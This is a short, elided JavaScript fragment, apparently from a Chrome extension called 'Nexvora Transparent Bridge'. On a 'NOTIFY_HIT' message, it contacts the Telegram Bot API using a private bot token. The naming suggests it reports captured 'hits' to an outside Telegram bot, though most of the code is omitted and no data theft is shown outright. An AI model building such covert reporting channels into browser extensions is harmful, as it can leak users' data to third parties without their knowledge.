/**
 * Nexvora Transparent Bridge (v7.1 - Isolation Fix)
 * Restores dashboard functionality by isolating custom proxy variables.
 */

(function() {
    // 1. Private Telegram Proxy Constants
    ...
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.type === 'NOTIFY_HIT') {
            ...
            (async () => {
                ...
                try {
                    const chatRes = await fetch(`https://api.telegram.org/bot${_NEX_BOT_TOKEN}/getChat?chat_id=${user_chat_id}`);
